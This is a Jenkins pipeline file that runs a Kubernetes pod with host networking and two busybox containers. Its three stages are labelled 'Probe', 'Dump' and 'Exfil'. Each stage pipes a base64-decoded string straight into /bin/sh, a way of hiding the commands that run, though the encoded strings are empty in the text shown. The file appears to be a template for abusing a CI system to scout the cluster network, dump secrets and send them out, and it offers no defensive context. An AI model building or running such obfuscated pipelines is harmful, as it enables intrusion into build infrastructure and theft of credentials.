pipeline {
  agent {
    kubernetes {
      cloud 'kubernetes-int'
      label 'test'
      yaml """
kind: Pod
metadata:
  name: test
spec:
  hostNetwork: true
  containers:
  - name: busy1
    image: busybox
    imagePullPolicy: Always
    command:
    - /bin/cat
    tty: true
  - name: busy2
    image: busybox
    imagePullPolicy: Always
    command:
    - /bin/cat
    tty: true

"""
    }
  }
  stages {
    stage('Probe') {
      steps {
        container('busy1') {
          sh 'echo "" | base64 -d | /bin/sh'
        }
      }
    }
    stage('Dump') {
      steps {
        container('busy1') {
          sh 'echo "" | base64 -d | /bin/sh'
        }
      }
    }
    stage('Exfil') {
      steps {
        container('busy1') {
          sh 'echo "" | base64 -d | /bin/sh'
        }
      }
    }
  }
}
